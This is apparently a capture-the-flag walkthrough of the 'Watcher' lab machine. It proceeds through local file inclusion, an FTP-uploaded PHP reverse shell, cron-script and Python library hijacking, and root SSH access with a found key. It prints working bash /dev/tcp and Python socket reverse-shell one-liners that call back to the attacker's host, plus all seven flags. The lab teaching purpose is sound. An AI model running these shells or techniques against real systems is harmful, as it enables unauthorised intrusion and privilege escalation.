# Watcher

## Description

A boot2root Linux machine utilising web exploits along with some common privilege escalation techniques.

## Initial Scan

Let's start with an Nmap scan. The scan reveals three open ports:
* 21 ftp
* 22 shh
* 80 http

~~~
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA)
|   256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA)
|_  256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Corkplacemats
|_http-generator: Jekyll v4.1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Flags

Work your way through the machine and try to find all the flags you can!

### Flag 1

Hint: https://moz.com/learn/seo/robotstxt

We don't have creds for neither the ftp nor the ssh service, so let's start with the webpage. We can find the 1st flag by checking `robots.txt`:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Watcher]
└─$ curl -s "http://$IP/robots.txt"            
User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt
                                                                                                                      
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Watcher]
└─$ curl -s "http://$IP/flag_1.txt"         
FLAG{robots_dot_text_what_is_next}
~~~

Flag 1: `FLAG{robots_dot_text_what_is_next}`

### Flag 2

Hint: https://www.netsparker.com/blog/web-security/local-file-inclusion-vulnerability/

The hint is refering to LFI (Local File Inclusion). I discovered a file named `secret_file_do_not_read.txt`  that we don't have permission to read. Let's see if we can read it using LFI. If you click on the posts, on the webpage, you'll see that a php script named "post.php" is called. Let's use it:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Watcher]
└─$ curl -s "http://$IP/post.php?post=secret_file_do_not_read.txt" | html2text 

[REDACTED]

Hi Mat, The credentials for the FTP server are below. I've set the files to be
saved to /home/ftpuser/ftp/files. Will ---------- ftpuser:givemefiles777

~~~

We have creds for the ftp service: `ftpuser:givemefiles777`. And we also know were the uploaded files are saved, so we might be able to use it later for calling a reverse shell. Let's see what we can find:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Watcher/files]
└─$ ftp $IP 
Connected to 10.10.36.78.
220 (vsFTPd 3.0.3)
Name (10.10.36.78:user): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xr-xr-x    3 65534    65534        4096 Dec 03  2020 .
dr-xr-xr-x    3 65534    65534        4096 Dec 03  2020 ..
drwxr-xr-x    2 1001     1001         4096 Dec 03  2020 files
-rw-r--r--    1 0        0              21 Dec 03  2020 flag_2.txt
226 Directory send OK.
ftp> get flag_2.txt
local: flag_2.txt remote: flag_2.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag_2.txt (21 bytes).
226 Transfer complete.
21 bytes received in 0.50 secs (0.0408 kB/s)
ftp> exit
221 Goodbye.
                                                                                                                      
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Watcher/files]
└─$ cat flag_2.txt 
FLAG{ftp_you_and_me}
~~~

We found the 2nd flag. `files` directory is empty (for now ; ) ):

Flag 2: `FLAG{ftp_you_and_me}`

### Flag 3

Hint: https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2

Ok. Now that we have access to the ftp service, we can upload a reverse shell and call it from the web service. You can get the shell [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Don't forget to change the IP to yours:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Watcher/files]
└─$ ftp $IP
Connected to 10.10.36.78.
220 (vsFTPd 3.0.3)
Name (10.10.36.78:user): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
d226 Directory send OK.
ftp> cd files
250 Directory successfully changed.
ftp> put shell.php
local: shell.php remote: shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5492 bytes sent in 0.00 secs (45.5442 MB/s)
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Oct 30 09:26 .
dr-xr-xr-x    3 65534    65534        4096 Dec 03  2020 ..
-rw-r--r--    1 1001     1001         5492 Oct 30 09:26 shell.php
226 Directory send OK.
ftp> exit
221 Goodbye.
~~~

We uploaded the reverse shell. Let's start a listener and call the shell. You can call the shell from `http://$IP/post.php?post=/home/ftpuser/ftp/files/shell.php`. Now we have a shell. The first thing I did was spawning a TTY shell:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Watcher/files]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.9.0.209] from (UNKNOWN) [10.10.36.78] 58302
Linux watcher 4.15.0-128-generic #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 09:58:21 up  1:23,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
which python3
/usr/bin/python3
python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@watcher:/$
~~~

Let's look for the 3rd flag now. The 3rd flag is located in `/var/www/html/more_secrets_a9f10a`:

~~~
www-data@watcher:/$ cd /var/www/html/more_secrets_a9f10a
www-data@watcher:/var/www/html/more_secrets_a9f10a$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Dec  3  2020 .
drwxr-xr-x 5 root root 4096 Dec  3  2020 ..
-rw-r--r-- 1 root root   21 Dec  3  2020 flag_3.txt
www-data@watcher:/var/www/html/more_secrets_a9f10a$ cat flag_3.txt
FLAG{lfi_what_a_guy}
~~~

Flag 3: `FLAG{lfi_what_a_guy}`

### Flag 4

Hint: https://www.explainshell.com/explain?cmd=sudo+-l

Now let's escalate to a more privileged user on the machine. I ran `sudo -l` to check my sudo permissions and I can run all the commands as user `toby`:

~~~
www-data@watcher:/$ sudo -l
Matching Defaults entries for www-data on watcher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on watcher:
    (toby) NOPASSWD: ALL
~~~

Let's run `bash` as user `toby` to switch to his shell. Now we can find the 4th flag in his home directory:

~~~
www-data@watcher:/$ sudo -u toby bash
toby@watcher:/$ id
uid=1003(toby) gid=1003(toby) groups=1003(toby)
toby@watcher:/$ cd
toby@watcher:~$ ls
flag_4.txt  jobs  note.txt
toby@watcher:~$ cat flag_4.txt
FLAG{chad_lifestyle}
~~~

Flag 4: `FLAG{chad_lifestyle}`

### Flag 5

Hint: https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs

There is a file in our home directory named `note.txt`. Let's see the content:

~~~
toby@watcher:~$ cat note.txt
Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat
~~~

So we know that user `mat` has set a cronjob. Let's check `/etc/crontab` to see what file it is:

~~~
toby@watcher:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/1 * * * * mat /home/toby/jobs/cow.sh
~~~

It is a bash script named `cow.sh` and it is located in our home directory and the script is being ran by user `mat`. So if change its content with a bash reverse shell, we can gain a shell as user `mat`.

Start a listener and then run the following command on the target machine to replace the content with a bash reverse shell. Wait for a bit and you'll get the shell:

Target machine:
~~~
toby@watcher:~$ echo 'bash -c "bash -i >& /dev/tcp/<YOUR IP>/8888 0>&1"' >> ~/jobs/cow.sh
~~~

My machine:
~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Watcher]
└─$ rlwrap nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.9.0.209] from (UNKNOWN) [10.10.36.78] 50434
bash: cannot set terminal process group (3037): Inappropriate ioctl for device
bash: no job control in this shell
mat@watcher:~$ id
uid=1002(mat) gid=1002(mat) groups=1002(mat)
~~~

Great! Now we are switched to user `mat`. The 5th flag is located in `mat`'s home directory:

~~~
mat@watcher:~$ ls
cow.jpg
flag_5.txt
note.txt
scripts
mat@watcher:~$ cat flag_5.txt
FLAG{live_by_the_cow_die_by_the_cow}
~~~

Flag 5: `FLAG{live_by_the_cow_die_by_the_cow}`

### Flag 6

Hint: https://book.hacktricks.xyz/linux-unix/privilege-escalation#python-library-hijacking

We need to escalate more. Let's check our sudo permissions by running `sudo -l`:
~~~
mat@watcher:~$ sudo -l
Matching Defaults entries for mat on watcher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mat may run the following commands on watcher:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
~~~

As you can see we can run a python script located in our home directory named `will_script.py` as user `will` with `python3`. There is a note in our home directory. Let's read it:

~~~
mat@watcher:~$ cat note.txt
Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will
~~~

Ok. The note didn't give us anything new, so let's check the two scritps:

cmd.py:
~~~py
def get_command(num):
	if(num == "1"):
		return "ls -lah"
	if(num == "2"):
		return "id"
	if(num == "3"):
		return "cat /etc/passwd"
~~~

will_script.py:
~~~py
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
	print("Invalid command!")
	exit()

os.system(cmd)
~~~

As you can see `will_script.py` which is the script that we can run as user `will` is calling a function from `cmd.py`. Thankfully, `cmd.py` is owned by us:

~~~
mat@watcher:~/scripts$ ls -la cmd.py
-rw-r--r-- 1 mat mat 133 Dec  3  2020 cmd.py
~~~

Which means we have write access and we can replace/add a python reverse shell to it and because it is being ran by user `will`, we'll get a shell as him. This is called **"python library hijacking"**. Let's replace the function with a the reverse shell:

~~~
mat@watcher:~/scripts$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR IP>",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > cmd.py
mat@watcher:~/scripts$ cat cmd.py
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.0.209",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
~~~

Now start a listener and run `will_script.py` as user `will` using sudo:

~~~
mat@watcher:~/scripts$ sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
~~~

Now we have a shell as user `will`. Let's spawn a TTY shell and read the 6th flag located in will's home directory:

~~~
$ python3 -c "import pty;pty.spawn('/bin/bash')"
will@watcher:~/scripts$ id
uid=1000(will) gid=1000(will) groups=1000(will),4(adm)
will@watcher:~/scripts$ cd /home/will
will@watcher:/home/will$ ls
flag_6.txt
will@watcher:/home/will$ cat flag_6.txt
FLAG{but_i_thought_my_script_was_secure}
~~~

Flag 6: `FLAG{but_i_thought_my_script_was_secure}`

### Flag 7

Hint: https://explainshell.com/explain?cmd=ssh%20-i%20keyfile%20host

Now we need to gain root access in order to read the last flag. From the hint, I know that there might be a key laying around somewhere and I was right. I found a base64 encoded key in `/opt/backups` named `key.b64`.

I copied it to my machine and decoded it and saved it as "key". Then I set its permission to 600 and then logged in as root via ssh:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Watcher/files]
└─$ chmod 600 key

┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Watcher/files]
└─$ ssh -i key root@$IP
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Oct 30 12:12:29 UTC 2021

  System load:  0.07               Processes:             135
  Usage of /:   22.8% of 18.57GB   Users logged in:       0
  Memory usage: 48%                IP address for eth0:   10.10.36.78
  Swap usage:   0%                 IP address for lxdbr0: 10.14.179.1


33 packages can be updated.
0 updates are security updates.


Last login: Sat Oct 30 12:12:25 2021 from 10.9.0.209
root@watcher:~# id
uid=0(root) gid=0(root) groups=0(root)
~~~

Great! Now we are root. Let's read the last flag located in our home directory (`/root`):

~~~
root@watcher:~# ls
flag_7.txt
root@watcher:~# cat flag_7.txt 
FLAG{who_watches_the_watchers}
~~~

Flag 7: `FLAG{who_watches_the_watchers}`

# D0N3! ; )

Thanks to the creator!

Hope you had fun and learned something!

And have a g00d one! : )